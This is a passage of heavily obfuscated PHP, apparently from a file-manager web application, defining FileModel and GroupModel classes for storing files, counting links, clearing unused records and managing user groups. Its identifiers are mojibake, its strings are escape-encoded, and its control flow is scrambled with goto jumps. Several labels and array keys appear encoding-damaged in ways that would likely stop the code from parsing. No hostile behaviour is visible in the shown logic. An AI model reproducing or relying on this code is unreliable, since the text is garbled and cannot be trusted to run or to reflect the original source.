$D‰­¹˜¦’[$Eéé¬èŠ¼[455]] . $aÀÌ™ğèªœ[$Eéé¬èŠ¼[457]] . $Eéé¬èŠ¼[480]); } goto d ®¼ÙéëŞ; d ®¼ÙéëŞ: if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[2143]]) && $aÀÌ™ğèªœ[$Eéé¬èŠ¼[2143]]) { $A¾„§‡ª»¬ = $aÀÌ™ğèªœ[$Eéé¬èŠ¼[2143]]; $B³†¿Ä©õ‹ = explode($Eéé¬èŠ¼[50], $A¾„§‡ª»¬); if (strlen($A¾„§‡ª»¬) > 2 && (substr($A¾„§‡ª»¬, 0, 1) == $Eéé¬èŠ¼[113] && substr($A¾„§‡ª»¬, -1) == $Eéé¬èŠ¼[113]) || substr($A¾„§‡ª»¬, 0, 1) == $Eéé¬èŠ¼[55] && substr($A¾„§‡ª»¬, -1) == $Eéé¬èŠ¼[55]) { $A¾„§‡ª»¬ = substr($A¾„§‡ª»¬, 1, -1); $B³†¿Ä©õ‹ = array($A¾„§‡ª»¬); } $a¶¦“ÊôÉ[$Eéé¬èŠ¼[28]] = array($Eéé¬èŠ¼[479], $Eéé¬èŠ¼[2145] . $A¾„§‡ª»¬ . $Eéé¬èŠ¼[2145]); if (count($B³†¿Ä©õ‹) > 1) { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[28]] = array(); foreach ($B³†¿Ä©õ‹ as $bğ©™½ŒÖŒ) { if (!trim($bğ©™½ŒÖŒ)) { continue; } $a¶¦“ÊôÉ[$Eéé¬èŠ¼[28]][] = array($Eéé¬èŠ¼[479], $Eéé¬èŠ¼[2145] . trim($bğ©™½ŒÖŒ) . $Eéé¬èŠ¼[2145]); } } } return $a¶¦“ÊôÉ; goto aéª»õ“ª÷; aéª»õ“ª÷: } } goto FƒŸˆ÷¥ğÙ; d¸ã¸¯À‚Š: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\145"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\x6d\x65" => "\151\x6f\137\x66\x69\x6c\145\137\x6d\145\x74\x61", "\155\x65\164\141\x46\151\145\x6c\144" => "\146\151\x6c\145\111\x44"); public function fileInfo($eÒ‡¦»ªè¨) { $fÃ’Åò…§ =& $_SERVER[¼]; static $aî°Â’Òâ° = array(); if (!isset($aî°Â’Òâ°[$eÒ‡¦»ªè¨])) { $bŠéÍ±»× = $fÃ’Åò…§[2109]; $fŒÍÕ‡©‰Û = Model($fÃ’Åò…§[418])->field($bŠéÍ±»×)->where(array($fÃ’Åò…§[416] => $eÒ‡¦»ªè¨))->find(); $aî°Â’Òâ°[$eÒ‡¦»ªè¨] = $fŒÍÕ‡©‰Û; } return $aî°Â’Òâ°[$eÒ‡¦»ªè¨]; } public function addFileByContent($bœÁ¢ˆè… = '', $f²Öõî‘—ˆ = '') { goto eî±öñ‚“‰; Aà§ŒŠ…®: if (file_exists($aªî”êç¥)) { @unlink($aªî”êç¥); } return $F§–Şø°‰; goto fë±¿ÂæÀè; eî±öñ‚“‰: $Cì—¸…Ë =& $_SERVER[¼]; $DÍ±¤Òà®â = TEMP_PATH . $Cì—¸…Ë[2110]; if (!is_dir($DÍ±¤Òà®â)) { mk_dir($DÍ±¤Òà®â); } goto cœâ¢§º¢¬; cœâ¢§º¢¬: $aªî”êç¥ = $DÍ±¤Òà®â . $Cì—¸…Ë[2111] . rand_string(16); file_put_contents($aªî”êç¥, $bœÁ¢ˆè…); $F§–Şø°‰ = $this->addFile($aªî”êç¥, $f²Öõî‘—ˆ, !0); goto Aà§ŒŠ…®; fë±¿ÂæÀè: } public function createFileName($B˜øŸ‡ñˆ¨) { goto cœà¿ì‡Ì; d®•¡è¬·—: if (!$EôÙŞŠ´Å» && !Cache::get($Bœ˜Ñ„¶ô)) { $EôÙŞŠ´Å» = !0; $D¤éí…ø°Ú = IO::mkdir($b‡Êõ˜ö´Ì); if (!IO::exist($D¤éí…ø°Ú . $Báàõ»›è¿[2113])) { IO::mkfile($D¤éí…ø°Ú . $Báàõ»›è¿[2113]); } Cache::set($Bœ˜Ñ„¶ô, 1, 3600 * 2); } return $A½Ñ‡†’ôğ; goto cºŞÂ¡“‘Œ; cœà¿ì‡Ì: $Báàõ»›è¿ =& $_SERVER[¼]; $bëß©ÇĞµÍ = IO::init($Báàõ»›è¿[8]); $A½Ñ‡†’ôğ = $this->makeFilePath($B˜øŸ‡ñˆ¨, $bëß©ÇĞµÍ); goto bùŒºªØå³; bùŒºªØå³: $b‡Êõ˜ö´Ì = $bëß©ÇĞµÍ->pathFather($A½Ñ‡†’ôğ); static $EôÙŞŠ´Å» = false; $Bœ˜Ñ„¶ô = $Báàõ»›è¿[2112] . md5($b‡Êõ˜ö´Ì); goto d®•¡è¬·—; cºŞÂ¡“‘Œ: } public function makeFilePath($FÒÉ©—»Ó, $eÀâ–ŒÑ²’) { goto fÖÌâ·Îé; Cƒ‚ªğø¸: $c“Ó†Ç‡á = $AÆÊ”¿šŠ . rand_string(5) . short_id(100); $FÒÉ©—»Ó = str_replace($a•Õ­²—¡Ê[8], $a•Õ­²—¡Ê[70], KodIO::clear($FÒÉ©—»Ó)); if (!$FÒÉ©—»Ó) { $Fé™ø™² = $a•Õ­²—¡Ê[2116]; } goto bµ‚Ä¨ï ; fÖÌâ·Îé: $a•Õ­²—¡Ê =& $_SERVER[¼]; $Fé™ø™² = Model($a•Õ­²—¡Ê[1081])->get($a•Õ­²—¡Ê[2114]); $AÆÊ”¿šŠ = KodIO::defaultIO() . date($a•Õ­²—¡Ê[2115]); goto Cƒ‚ªğø¸; bµ‚Ä¨ï : switch ($Fé™ø™²) { case $a•Õ­²—¡Ê[2117]: $c“Ó†Ç‡á = $c“Ó†Ç‡á . $a•Õ­²—¡Ê[93] . $eÀâ–ŒÑ²’->ext($FÒÉ©—»Ó); if ($eÀâ–ŒÑ²’->ext($FÒÉ©—»Ó) == $a•Õ­²—¡Ê[2057]) { $c“Ó†Ç‡á .= $a•Õ­²—¡Ê[2118]; } break; case $a•Õ­²—¡Ê[2119]: goto A¿Ò‡ßëÈã; dô‘âÕ¤òÎ: break; goto A°í÷ÇÏù³; A¿Ò‡ßëÈã: $C„™Êª–¨â = Model($a•Õ­²—¡Ê[1081])->get($a•Õ­²—¡Ê[1305]); $eÛ·íËóí„ = substr(md5($a•Õ­²—¡Ê[1877] . $C„™Êª–¨â . date($a•Õ­²—¡Ê[679])), 0, 8); $AÆÊ”¿šŠ = KodIO::defaultIO() . date($a•Õ­²—¡Ê[2120]) . $eÛ·íËóí„ . $a•Õ­²—¡Ê[8]; goto EÓæàÇ¡‘…; EÓæàÇ¡‘…: if ($eÀâ–ŒÑ²’->ext($FÒÉ©—»Ó) == $a•Õ­²—¡Ê[2057]) { $FÒÉ©—»Ó .= $a•Õ­²—¡Ê[2118]; } $f•æªŸÈ = IO::fileNameAuto($AÆÊ”¿šŠ, $FÒÉ©—»Ó); $c“Ó†Ç‡á = $AÆÊ”¿šŠ . $f•æªŸÈ; goto dô‘âÕ¤òÎ; A°í÷ÇÏù³: case $a•Õ­²—¡Ê[2116]: break; default: break; } return $c“Ó†Ç‡á; goto d„†„ëñÓˆ; d„†„ëñÓˆ: } public function addFileByRemote($bœƒ‰ÓÑ¶, $C¥ùÀñÃÃÕ, $Aª‹Öºšâ© = array()) { goto c¨×‚²ˆË; c¨×‚²ˆË: $A”œ•š¥ =& $_SERVER[¼]; if (!IO::exist($bœƒ‰ÓÑ¶)) { return !1; } $cµÄ†¶ĞØ = $Aª‹Öºšâ©[$A”œ•š¥[160]] ? $Aª‹Öºšâ©[$A”œ•š¥[160]] : $A”œ•š¥[33]; goto bÇìÖ·ÑÈÇ; dÙ‘÷ù‡÷: if ($AßÊÍ³¬ˆ“ = $this->addFileCheckExist($Däª•Áâó¹[$A”œ•š¥[161]], $Däª•Áâó¹[$A”œ•š¥[160]], $Däª•Áâó¹[$A”œ•š¥[77]])) { return $AßÊÍ³¬ˆ“; } return $this->addFileData($Däª•Áâó¹); goto BÜ–¬ÈĞïÌ; bÇìÖ·ÑÈÇ: $d­š˜¥ÕÑé = IO::hashMd5($bœƒ‰ÓÑ¶, $cµÄ†¶ĞØ); $B¯ƒíƒ‘…½ = KodIO::defaultDriver(); $Däª•Áâó¹ = array($A”œ•š¥[516] => IO::size($bœƒ‰ÓÑ¶), $A”œ•š¥[2121] => 1, $A”œ•š¥[383] => $C¥ùÀñÃÃÕ, $A”œ•š¥[727] => $B¯ƒíƒ‘…½[$A”œ•š¥[364]], $A”œ•š¥[384] => $bœƒ‰ÓÑ¶, $A”œ•š¥[2122] => $Aª‹Öºšâ©[$A”œ•š¥[161]] ? $Aª‹Öºšâ©[$A”œ•š¥[161]] : IO::hashSimple($bœƒ‰ÓÑ¶), $A”œ•š¥[2123] => $d­š˜¥ÕÑé ? $d­š˜¥ÕÑé : $cµÄ†¶ĞØ); goto dÙ‘÷ù‡÷; BÜ–¬ÈĞïÌ: } private function addFileData($BïõµËí­) { $e¤Óº¬Â¦ =& $_SERVER[¼]; if (!$BïõµËí­) { return !1; } $BïõµËí­[$e¤Óº¬Â¦[77]] = intval($BïõµËí­[$e¤Óº¬Â¦[77]]); if (!$BïõµËí­[$e¤Óº¬Â¦[77]] && strlen($BïõµËí­[$e¤Óº¬Â¦[161]]) > 32) { $BïõµËí­[$e¤Óº¬Â¦[77]] = intval(substr($BïõµËí­[$e¤Óº¬Â¦[161]], 32)); } $e”°§­¹—ï = $this->add($BïõµËí­); return $this->find($e”°§­¹—ï); } public function addFile($aÃÈä˜±¿¿, $dÍ‹åØã, $f²Âšíæõ° = false) { $f–ÛòÈÃÍ³ = IO::hashSimple($aÃÈä˜±¿¿); $A£íõõÏµ‚ = IO::hashMd5($aÃÈä˜±¿¿); $C‹›ŸŒ…µÄ = IO::size($aÃÈä˜±¿¿); if ($FÇ’ğ¾Ó« = $this->addFileCheckExist($f–ÛòÈÃÍ³, $A£íõõÏµ‚, $C‹›ŸŒ…µÄ)) { return $FÇ’ğ¾Ó«; } $d‡òôÆ¸áó = $this->addFileMake($aÃÈä˜±¿¿, $C‹›ŸŒ…µÄ, $f–ÛòÈÃÍ³, $A£íõõÏµ‚, $dÍ‹åØã, $f²Âšíæõ°); return $this->addFileData($d‡òôÆ¸áó); } public function addFileMake($AßÚõªÃ­ê, $A®‹ßóŸ¶, $CÀ âæ§ÍÎ, $cõ©•‚‘¾‰, $B˜Ù£İõ, $BÃãŒÜÉªÛ) { goto FÂÁ¶æÀù; a¤¤½á»¼: $fÜÕÙ¡à¢ = get_path_this($e–ÖÄ‚‘¡«); if ($BÃãŒÜÉªÛ) { $e¥äİÄÎĞ = IO::move($AßÚõªÃ­ê, $c­„í÷ , !1, $fÜÕÙ¡à¢); } else { $e¥äİÄÎĞ = IO::copy($AßÚõªÃ­ê, $c­„í÷ , !1, $fÜÕÙ¡à¢); } if (!$e¥äİÄÎĞ) { return !1; } goto E‘‹ÔøàíÎ; E‘‹ÔøàíÎ: $dĞ£Ú‚¤³Ä = KodIO::defaultDriver(); $cÖ¿Á¡¸ñº = array($eÂÖòæÀ®§[516] => $A®‹ßóŸ¶, $eÂÖòæÀ®§[2121] => 1, $eÂÖòæÀ®§[383] => $B˜Ù£İõ, $eÂÖòæÀ®§[727] => $dĞ£Ú‚¤³Ä[$eÂÖòæÀ®§[364]], $eÂÖòæÀ®§[384] => $e–ÖÄ‚‘¡«, $eÂÖòæÀ®§[2122] => $CÀ âæ§ÍÎ, $eÂÖòæÀ®§[2123] => $cõ©•‚‘¾‰); return $cÖ¿Á¡¸ñº; goto C¢Š¾¥ ”; FÂÁ¶æÀù: $eÂÖòæÀ®§ =& $_SERVER[¼]; $e–ÖÄ‚‘¡« = $this->createFileName($B˜Ù£İõ); $c­„í÷  = get_path_father($e–ÖÄ‚‘¡«); goto a¤¤½á»¼; C¢Š¾¥ ”: } public function addFileCheckExist($CêÑ§Ÿ®ß, $Eïßˆµàí, $f£±œŞª¾) { $díÉà­ÉùĞ =& $_SERVER[¼]; $dĞ»ß¿Ö‚® = $this->findByHash($CêÑ§Ÿ®ß, $Eïßˆµàí); if (!$dĞ»ß¿Ö‚®) { return !1; } $BÏ›“Ã·Ä® = array($díÉà­ÉùĞ[2121] => intval($dĞ»ß¿Ö‚®[$díÉà­ÉùĞ[2124]]) + 1, $díÉà­ÉùĞ[516] => $f£±œŞª¾); $this->where(array($díÉà­ÉùĞ[416] => $dĞ»ß¿Ö‚®[$díÉà­ÉùĞ[415]]))->save($BÏ›“Ã·Ä®); return $dĞ»ß¿Ö‚®; } public function remove($Eì…ç„™¥¬) { $this->linkCountChange($Eì…ç„™¥¬, !1); $this->clearEmpty(); return !0; } public function linkAdd($fëÅ¡šÉ¨İ) { $this->linkCountChange($fëÅ¡šÉ¨İ, !0); } public function linkCountChange($bè„ºéõ²Š, $cµİÛ‰ô) { goto CŸã«‹Ü•; CŸã«‹Ü•: $eºĞ‘î¹‡Ş =& $_SERVER[¼]; if (!$bè„ºéõ²Š) { return; } if (!is_array($bè„ºéõ²Š)) { $bè„ºéõ²Š = array($bè„ºéõ²Š); } goto C™™ô¤½‡ã; EÌ¿©õšÛÄ: foreach ($Bò…­”ˆÀš as $AÁ‚Ïè³«ã => $Cçšå¦ŒŒ) { $dÌ™ï­ô÷Š = $Cçšå¦ŒŒ . $eºĞ‘î¹‡Ş[33]; if (!$FÕ£‰½¯á¨[$dÌ™ï­ô÷Š]) { $FÕ£‰½¯á¨[$dÌ™ï­ô÷Š] = array(); } $FÕ£‰½¯á¨[$dÌ™ï­ô÷Š][] = $AÁ‚Ïè³«ã; } foreach ($FÕ£‰½¯á¨ as $Cçšå¦ŒŒ => $bˆÛÉø¬®¹) { if (!$bˆÛÉø¬®¹) { continue; } $Cçšå¦ŒŒ = $cµİÛ‰ô ? $Cçšå¦ŒŒ : -intval($Cçšå¦ŒŒ); $E›íÕ„¤Ê = array($eºĞ‘î¹‡Ş[415] => array($eºĞ‘î¹‡Ş[7], $bˆÛÉø¬®¹)); if ($Cçšå¦ŒŒ < 0) { $E›íÕ„¤Ê[$eºĞ‘î¹‡Ş[2124]] = array($eºĞ‘î¹‡Ş[924], abs($Cçšå¦ŒŒ)); } $this->where($E›íÕ„¤Ê)->setAdd($eºĞ‘î¹‡Ş[2124], $Cçšå¦ŒŒ); } goto DâÄé–‚; C™™ô¤½‡ã: $Bò…­”ˆÀš = array(); foreach ($bè„ºéõ²Š as $AÁ‚Ïè³«ã) { $dÌ™ï­ô÷Š = $AÁ‚Ïè³«ã . $eºĞ‘î¹‡Ş[33]; if (!$Bò…­”ˆÀš[$dÌ™ï­ô÷Š]) { $Bò…­”ˆÀš[$dÌ™ï­ô÷Š] = 0; } $Bò…­”ˆÀš[$dÌ™ï­ô÷Š]++; } $FÕ£‰½¯á¨ = array(); goto EÌ¿©õšÛÄ; DâÄé–‚: } public function findByHash($Aœ×ÅŒ™à¯, $díè¿³Ç¾ = false) { $aØ»Áº¿ì© =& $_SERVER[¼]; if (!$Aœ×ÅŒ™à¯ && !$díè¿³Ç¾) { return !1; } $Eªï‹•ƒÊ× = array($aØ»Áº¿ì©[2122] => $Aœ×ÅŒ™à¯); if ($díè¿³Ç¾) { $Eªï‹•ƒÊ× = array($aØ»Áº¿ì©[2123] => $díè¿³Ç¾); } return $this->order($aØ»Áº¿ì©[2125])->where($Eªï‹•ƒÊ×)->find(); } public function clearEmpty($bÎš¦ÇßˆÃ = 0) { goto c‚ïôÓáî÷; BÕº˜éÌ…é: foreach ($C¾÷‚ÛÇ„ì as $D«ÊÒë¹…æ) { $f±‹‚‘ø›Š->update(1); $this->resetFile($D«ÊÒë¹…æ); } $f±‹‚‘ø›Š->end(); goto bÑ„š”‹‰‰; c‚ïôÓáî÷: $F Î¯ì‹ôø =& $_SERVER[¼]; $f‰»¼ŞÇŠ = time() - 3600 * 24 * $bÎš¦ÇßˆÃ; $D¨„“Ğ”ƒŒ = $F Î¯ì‹ôø[2126] . $f‰»¼ŞÇŠ; goto AÃŒà°“¯Ñ; AÃŒà°“¯Ñ: $C¾÷‚ÛÇ„ì = $this->where($D¨„“Ğ”ƒŒ)->select(); if (!$C¾÷‚ÛÇ„ì) { return; } $f±‹‚‘ø›Š = new Task($F Î¯ì‹ôø[2127], $F Î¯ì‹ôø[33], count($C¾÷‚ÛÇ„ì)); goto BÕº˜éÌ…é; bÑ„š”‹‰‰: } private function resetFile($bŞ®˜¿š¤) { goto a›İƒ¦à²; d…Ò÷œ“íƒ: $a™†¾’ÔÒ = Model($bª³®Ğä‹ö[2128])->where($cË‰îí‹ö)->count(); $Bèéêª˜ÉÆ = intval($AöÙ‹Ñá°¨) + intval($a™†¾’ÔÒ); if ($Bèéêª˜ÉÆ == 0) { IO::remove($bŞ®˜¿š¤[$bª³®Ğä‹ö[75]]); $this->where($cË‰îí‹ö)->delete(); $this->metaSet($bŞ®˜¿š¤[$bª³®Ğä‹ö[415]], null, null); return; } goto DÕ‰„Õáåì; DÕ‰„Õáåì: if ($bŞ®˜¿š¤[$bª³®Ğä‹ö[2124]] != $Bèéêª˜ÉÆ) { $this->where($cË‰îí‹ö)->save(array($bª³®Ğä‹ö[2121] => $Bèéêª˜ÉÆ)); } goto cË³ï±ùŒß; a›İƒ¦à²: $bª³®Ğä‹ö =& $_SERVER[¼]; $cË‰îí‹ö = array($bª³®Ğä‹ö[416] => $bŞ®˜¿š¤[$bª³®Ğä‹ö[415]]); $AöÙ‹Ñá°¨ = Model($bª³®Ğä‹ö[1103])->where($cË‰îí‹ö)->count(); goto d…Ò÷œ“íƒ; cË³ï±ùŒß: } public function storageInfo($F®‰±ñ—ŠÁ = false) { goto Fàí«ŒéˆŒ; eô×¡‘¯¥î: for ($FÌŠÜ½«Î÷ = 0; $FÌŠÜ½«Î÷ < $B—°õŞ™­¢; $FÌŠÜ½«Î÷ = $FÌŠÜ½«Î÷ + $a…“ŠÄ¦ Ô) { $eĞÚŸÀÑÊ = $this->limit($FÌŠÜ½«Î÷, $FÌŠÜ½«Î÷ + $a…“ŠÄ¦ Ô)->select(); foreach ($eĞÚŸÀÑÊ as $fßÕÅ¼‹) { $cè¦•§Şá += $fßÕÅ¼‹[$C‡’ÅèÛß[77]] * $fßÕÅ¼‹[$C‡’ÅèÛß[2124]]; $añÓ³œØèÙ += $fßÕÅ¼‹[$C‡’ÅèÛß[77]] * ($fßÕÅ¼‹[$C‡’ÅèÛß[2124]] - 1); $E­åÆ½ò®Ú += $fßÕÅ¼‹[$C‡’ÅèÛß[2124]]; } } $FËŠ±ƒÃŒ‘ = array($C‡’ÅèÛß[2129] => $cè¦•§Şá, $C‡’ÅèÛß[2130] => $añÓ³œØèÙ, $C‡’ÅèÛß[2131] => $añÓ³œØèÙ / $cè¦•§Şá, $C‡’ÅèÛß[81] => $B—°õŞ™­¢, $C‡’ÅèÛß[2132] => $E­åÆ½ò®Ú); return $FËŠ±ƒÃŒ‘; goto c¸İ†›„ò; Fàí«ŒéˆŒ: $C‡’ÅèÛß =& $_SERVER[¼]; $B—°õŞ™­¢ = $this->count() + 0.0; $añÓ³œØèÙ = 0; goto a™ëº²ªİ; a™ëº²ªİ: $cè¦•§Şá = 1; $E­åÆ½ò®Ú = 0; $a…“ŠÄ¦ Ô = 5000; goto eô×¡‘¯¥î; c¸İ†›„ò: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\x65" => "\x67\x72\157\x75\x70\137\x6d\145\x74\x61", "\155\145\x74\141\x46\151\145\x6c\x64" => "\147\x72\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($cÉæº‘ƒ¾) { $A¨“ª—‚’Î =& $_SERVER[¼]; return array($A¨“ª—‚’Î[2133] => array($cÉæº‘ƒ¾[0], $A¨“ª—‚’Î[2134]), $A¨“ª—‚’Î[2135] => array($cÉæº‘ƒ¾[0], $A¨“ª—‚’Î[2134])); } protected function getInfo($f„ŠÜÓÌÎ) { $FËêÒ˜¨“ç = $this->getInfoSimple($f„ŠÜÓÌÎ); if (!$FËêÒ˜¨“ç) { return !1; } return $this->_listDataApplyItem($FËêÒ˜¨“ç); } protected function getInfoSimple($BĞæãáÁ†, $C¢çíˆÑõ• = false) { $bÓš§›ô¾æ =& $_SERVER[¼]; if ($C¢çíˆÑõ•) { $aÔì´Ä°è¼ = array($bÓš§›ô¾æ[2067] => intval($BĞæãáÁ†)); $CÆÀ¼¤ƒÈ = $this->where($aÔì´Ä°è¼)->find(); return is_array($CÆÀ¼¤ƒÈ) ? $CÆÀ¼¤ƒÈ : array(); } return $this->cacheFunctionGet($bÓš§›ô¾æ[2136], $BĞæãáÁ†); } protected function groupAdd($FšÊ±³Íö) { goto A¹äßàáÇ; c—È•¾¤†İ: if ($BøÂƒßà¿[$F¶…“ƒõİ[455]]) { $dæ´¢ùåÍà = $BøÂƒßà¿[$F¶…“ƒõİ[455]] . $BøÂƒßà¿[$F¶…“ƒõİ[2067]] . $F¶…“ƒõİ[47]; } $C–Éõõ± = array($F¶…“ƒõİ[383] => $this->groupNameAuto($FšÊ±³Íö[$F¶…“ƒõİ[457]], $FšÊ±³Íö[$F¶…“ƒõİ[28]]), $F¶…“ƒõİ[365] => $FšÊ±³Íö[$F¶…“ƒõİ[457]], $F¶…“ƒõİ[521] => $dæ´¢ùåÍà, $F¶…“ƒõİ[2137] => $FšÊ±³Íö[$F¶…“ƒõİ[2051]], $F¶…“ƒõİ[2138] => 0, $F¶…“ƒõİ[2071] => 0); if (!empty($FšÊ±³Íö[$F¶…“ƒõİ[2067]])) { $C–Éõõ±[$F¶…“ƒõİ[2067]] = $FšÊ±³Íö[$F¶…“ƒõİ[2067]]; } goto e¹õÒ“¬¤¸; FÓßùôÅÛ: return $D¿²ŠöÅ; goto C¡ëİöí“Ÿ; A¹äßàáÇ: $F¶…“ƒõİ =& $_SERVER[¼]; if (!$FšÊ±³Íö[$F¶…“ƒõİ[457]] && isset($FšÊ±³Íö[$F¶…“ƒõİ[2067]]) && $FšÊ±³Íö[$F¶…“ƒõİ[2067]] == 1) { if ($BøÂƒßà¿ = $this->getInfoSimple($FšÊ±³Íö[$F¶…“ƒõİ[2067]], !0)) { return $FšÊ±³Íö[$F¶…“ƒõİ[2067]]; } } else { $BøÂƒßà¿ = $this->getInfoSimple($FšÊ±³Íö[$F¶…“ƒõİ[457]]); if (!$BøÂƒßà¿) { return !1; } } $dæ´¢ùåÍà = $F¶…“ƒõİ[466]; goto c—È•¾¤†İ; e¹õÒ“¬¤¸: $D¿²ŠöÅ = $this->add($C–Éõõ±); $this->setNamePinyin($D¿²ŠöÅ, $C–Éõõ±[$F¶…“ƒõİ[28]]); Model($F¶…“ƒõİ[1103])->groupRootAdd($D¿²ŠöÅ); goto FÓßùôÅÛ; C¡ëİöí“Ÿ: } protected function groupEdit($fŸ„³Ê„†, $EíÒÙƒê¼×) { $E²÷†ÅŒÜĞ =& $_SERVER[¼]; if (!empty($EíÒÙƒê¼×[$E²÷†ÅŒÜĞ[457]])) { $c‘½†Ë‚‚Ó = $this->getInfoSimple($fŸ„³Ê„†); $a†å¿›ï = $this->getInfoSimple($EíÒÙƒê¼×[$E²÷†ÅŒÜĞ[457]]); if (!$c‘½†Ë‚‚Ó || !$a†å¿›ï) { return !1; } if ($c‘½†Ë‚‚Ó[$E²÷†ÅŒÜĞ[2067]] == $a†å¿›ï[$E²÷†ÅŒÜĞ[2067]]) { return !1; } if ($EíÒÙƒê¼×[$E²÷†ÅŒÜĞ[457]] != $c‘½†Ë‚‚Ó[$E²÷†ÅŒÜĞ[457]]) { if ($a†å¿›ï[$E²÷†ÅŒÜĞ[455]] !== $c‘½†Ë‚‚Ó[$E²÷†ÅŒÜĞ[455]] && strpos($a†å¿›ï[$E²÷†ÅŒÜĞ[455]], $c‘½†Ë‚‚Ó[$E²÷†ÅŒÜĞ[455]] . $c‘½†Ë‚‚Ó[$E²÷†ÅŒÜĞ[2067]] . $E²÷†ÅŒÜĞ[47]) === 0) { return !1; } $EíÒÙƒê¼×[$E²÷†ÅŒÜĞ[521]] = $a†å¿›ï[$E²÷†ÅŒÜĞ[455]] . $EíÒÙƒê¼×[$E²÷†ÅŒÜĞ[457]] . $E²÷†ÅŒÜĞ[47]; $this->_changeChildLevel($c‘½†Ë‚‚Ó, $a†å¿›ï); } } if (isset($EíÒÙƒê¼×[$E²÷†ÅŒÜĞ[28]])) { $this->setNamePinyin($fŸ„³Ê„†, $EíÒÙƒê¼×[$E²÷†ÅŒÜĞ[28]]); } return $this->where(array($E²÷†ÅŒÜĞ[2139] => $fŸ„³Ê„†))->save($EíÒÙƒê¼×); } private function _changeChildLevel($E¤×ÁÎçğ½, $AÀ³°®Ô‹…, $d¾éö¹…‰ = false) { goto BÁˆ×š‘; e°«¬ô‹: if ($d¾éö¹…‰) { $BõØÓÒ¤Œº = $AÀ³°®Ô‹…[$Dø¢‰ñÒ÷š[455]] . $AÀ³°®Ô‹…[$Dø¢‰ñÒ÷š[2067]] . $Dø¢‰ñÒ÷š[47]; } $fÎ÷´Âæä = array($Dø¢‰ñÒ÷š[521] => array($Dø¢‰ñÒ÷š[479], $E¤×ÁÎçğ½[$Dø¢‰ñÒ÷š[455]] . $E¤×ÁÎçğ½[$Dø¢‰ñÒ÷š[2067]] . $Dø¢‰ñÒ÷š[480])); $eŠÀ‚å•š™ = array($Dø¢‰ñÒ÷š[521] => array($Dø¢‰ñÒ÷š[530], "\162\x65\x70\154\x61\x63\x65\50\160\x61\x72\x65\x6e\164\114\145\x76\x65\154\x2c\47{$d¬éŸ§—Ïš}\47\x2c\47{$BõØÓÒ¤Œº}\x27\51")); goto C‹òƒˆ³ß; BÁˆ×š‘: $Dø¢‰ñÒ÷š =& $_SERVER[¼]; $d¬éŸ§—Ïš = $E¤×ÁÎçğ½[$Dø¢‰ñÒ÷š[455]] . $E¤×ÁÎçğ½[$Dø¢‰ñÒ÷š[2067]] . $Dø¢‰ñÒ÷š[47]; $BõØÓÒ¤Œº = $AÀ³°®Ô‹…[$Dø¢‰ñÒ÷š[455]] . $AÀ³°®Ô‹…[$Dø¢‰ñÒ÷š[2067]] . $Dø¢‰ñÒ÷š[47] . $E¤×ÁÎçğ½[$Dø¢‰ñÒ÷š[2067]] . $Dø¢‰ñÒ÷š[47]; goto e°«¬ô‹; C‹òƒˆ³ß: $this->where($fÎ÷´Âæä)->data($eŠÀ‚å•š™)->save(); goto Bôöèñº¹ç; Bôöèñº¹ç: } public function setNamePinyin($F˜×ˆ íà, $fåøÈ‚Ô¾ = false) { $aœ§ ÚíëÒ =& $_SERVER[¼]; if (!$fåøÈ‚Ô¾) { $A÷ˆƒÇõÌ¼ = $this->getInfoSimple($F˜×ˆ íà); $fåøÈ‚Ô¾ = $A÷ˆƒÇõÌ¼[$aœ§ ÚíëÒ[28]]; } if (!Input::check($fåøÈ‚Ô¾, $aœ§ ÚíëÒ[524])) { $this->metaSet($F˜×ˆ íà, $aœ§ ÚíëÒ[412], null); $this->metaSet($F˜×ˆ íà, $aœ§ ÚíëÒ[411], null); return; } $eÆ¥ƒ­¾á = array($aœ§ ÚíëÒ[412] => str_replace($aœ§ ÚíëÒ[50], $aœ§ ÚíëÒ[33], Pinyin::encode($fåøÈ‚Ô¾)), $aœ§ ÚíëÒ[411] => Pinyin::encode($fåøÈ‚Ô¾, $aœ§ ÚíëÒ[525])); $this->metaSet($F˜×ˆ íà, $eÆ¥ƒ­¾á); } protected function groupRemove($Aé‰É“Íò©) { goto A£Â×õ¨’; D‡’¢‘‘ïõ: Model($D¯˜òƒè[744])->groupRootRemove($Aé‰É“Íò©); return $this->where($AÛ¼¥ÍÇ)->delete(); goto d›÷àœ­; b™ÅçÇêª±: $this->where(array($D¯˜òƒè[457] => $Aé‰É“Íò©))->save(array($D¯˜òƒè[457] => $aÉ·Á¶ˆ¥¨[$D¯˜òƒè[457]])); Model($D¯˜òƒè[2140])->where($AÛ¼¥ÍÇ)->delete(); Model($D¯˜òƒè[2141])->where($AÛ¼¥ÍÇ)->delete(); goto D‡’¢‘‘ïõ; bÜ¥¸¦¼÷: if (!$aÉ·Á¶ˆ¥¨ || $aÉ·Á¶ˆ¥¨[$D¯˜òƒè[457]] == 0) { return !1; } $BÕè¢æÉ„Ó = $this->getInfoSimple($aÉ·Á¶ˆ¥¨[$D¯˜òƒè[457]]); $this->_changeChildLevel($aÉ·Á¶ˆ¥¨, $BÕè¢æÉ„Ó, !0); goto b™ÅçÇêª±; A£Â×õ¨’: $D¯˜òƒè =& $_SERVER[¼]; $AÛ¼¥ÍÇ = array($D¯˜òƒè[2067] => $Aé‰É“Íò©); $aÉ·Á¶ˆ¥¨ = $this->where($AÛ¼¥ÍÇ)->find(); goto bÜ¥¸¦¼÷; d›÷àœ­: } public function listData() { $F”ÀÉó×ç¾ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($F”ÀÉó×ç¾[$_SERVER[¼][351]]); return $F”ÀÉó×ç¾; } private function _makeOrder($b·Ïâ›«±ñ = '') { goto A”ÍŠËÛˆ¶; e¨Õ¶˜Í: $e™ó—’ÃáÍ = Input::get($cë®„‡‡Š[403], $cë®„‡‡Š[7], $cë®„‡‡Š[2139], $A±ù®„ƒ„Å); $eİéÂ‰ô¬ = Input::get($cë®„‡‡Š[404], $cë®„‡‡Š[7], $cë®„‡‡Š[2142], array($cë®„‡‡Š[2142], $cë®„‡‡Š[400])); $eİéÂ‰ô¬ = $DÂ£º¤İ½[$eİéÂ‰ô¬]; goto dÜÍÒœ©ê; dÜÍÒœ©ê: $b·Ïâ›«±ñ = $b·Ïâ›«±ñ . 